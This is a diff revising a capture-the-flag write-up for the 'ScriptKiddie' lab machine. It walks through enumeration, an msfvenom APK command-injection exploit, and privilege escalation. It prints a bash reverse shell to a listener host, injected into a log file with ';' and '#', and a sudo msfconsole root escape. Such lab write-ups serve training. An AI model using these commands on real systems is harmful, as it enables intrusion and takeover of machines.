@@ -7,11 +7,11 @@ title: ScriptKiddie
 
 ### Enumeration
 
-I'll start with a quick `nmap` scan to enumerate open ports.
+I start with a quick `nmap` scan to enumerate open ports.
 
 `nmap -sC -sV -oN nmap/basic scriptkiddie.htb`
 
-Pretty barebones machine, only ports 22 and 80 are open.
+The results indicate a pretty barebones machine, only ports 22 and 5000 are open.
 
 ```
 PORT     STATE SERVICE VERSION
@@ -26,20 +26,20 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-I'll run a couple `gobuster` searches in the background while I check out the webserver but I'm not going to find anything.
+I ran a couple `gobuster` searches in the background to enumerate web directories or possible subdomains but I didn't find anything
 
-The webpage appears to have a few different functionalities. Seems like it will run an nmap scan, create msfvenom payloads or search via searchsploit for user inputs.
+The webpage appeared to have a few different functionalities. It seems like it will run an nmap scan, create msfvenom payloads or search via searchsploit for user inputs.
 
 ![Webpage](https://user-images.githubusercontent.com/60187707/120905511-1fcd6000-c618-11eb-84a6-366d172a44fb.png)
 
 ### Initial Foothold
-After searching for information about the backend system, I found an RCE script for Werkzeuk but does not seem to work as the debugging function in question is not enabled on the server.
+After searching for information about the backend system, I found an RCE script for Werkzeuk but it did not seem to work as the debugging function in question is not enabled on the server.
 
 ![Pasted image 20210603130610](https://user-images.githubusercontent.com/60187707/120905665-4213ad80-c619-11eb-8fe3-241bcfae6cd0.png)
 
-The `msfvenom` widget has Android templates as an optional file upload and, after a bit of googling, found [this script.](https://packetstormsecurity.com/files/161200/Metasploit-Framework-6.0.11-Command-Injection.html)
+The `msfvenom` widget has Android templates as an optional file upload and, after a bit of googling, I found [this script](https://packetstormsecurity.com/files/161200/Metasploit-Framework-6.0.11-Command-Injection.html)
 
-Essentially, it exploits a vulnerability in `msfvenom` that will execute a payload hidden inside a `.apk` template. Use `apk.py` to generate the malicious package.
+Essentially, it exploits a vulnerability in `msfvenom` that will execute a payload hidden inside a `.apk` template. I used `apk.py` to generate the malicious package.
 
 ![Pasted image 20210604102216](https://user-images.githubusercontent.com/60187707/120905729-b5b5ba80-c619-11eb-899b-de82a6a4ec47.png)
 
@@ -53,7 +53,7 @@ I tried a few various bash reverse shells as my payload, but using `socat` was w
 I am on as the user `kid`.
 
 #### Privesc
-I do some poking around the filesystem, run `linPEAS`, and find indications of a possible `sudo` vulnerability, but that ended up being a dead-end.
+I did some poking around the filesystem, ran `linPEAS`, and found indications of a possible `sudo` vulnerability, but that ended up being a dead-end.
 
 Inside the user `pwn` directory, there is a script called `scanlosers.sh`. As far as I can tell, the script takes data from the file `/home/kid/logs/hackers` to run an `nmap` command.
 
@@ -63,7 +63,7 @@ I can write to `hackers` because `kid` is the owner.
 
 ![Pasted image 20210604121933](https://user-images.githubusercontent.com/60187707/120905840-8489ba00-c61a-11eb-9f3a-5468e8dd6589.png)
 
-So, I'll start a listener and `echo` a reverse shell into `hackers`, with a `;` at the beginning to start a new command and a `#` at the end to comment out the rest of the script.
+So, I started a listener and used `echo` to place a reverse shell into `hackers`, with a `;` at the beginning to start a new command and a `#` at the end to comment out the rest of the script.
 
 `echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/1234 0>&1' #" >> hackers`
 
@@ -71,16 +71,16 @@ So, I'll start a listener and `echo` a reverse shell into `hackers`, with a `;` 
 
 Now, I'm on as user `pwn`.
 
-Run a quick `sudo -l` to check `pwn`'s permissions.
+I ran a quick `sudo -l` to check `pwn`'s permissions.
 
 ![Pasted image 20210604122204](https://user-images.githubusercontent.com/60187707/120905913-f4984000-c61a-11eb-89c4-dbd399b3a703.png)
 
-I can run `msfconsole` as `root` without a password. Seems promising!
+The results indicate that I can run `msfconsole` as `root` without a password.
 
-Checking the `msfconsole` help page, I find a `-x` flag that will execute console commands. Could it be that easy?
+Checking the `msfconsole` help page, I found a `-x` flag that will execute console commands.
 
 `sudo msfconsole -x su`
 
 ![Pasted image 20210604122329](https://user-images.githubusercontent.com/60187707/120905920-04178900-c61b-11eb-9dfc-d12292cab333.png)
 
-Apparently!
+Root access!
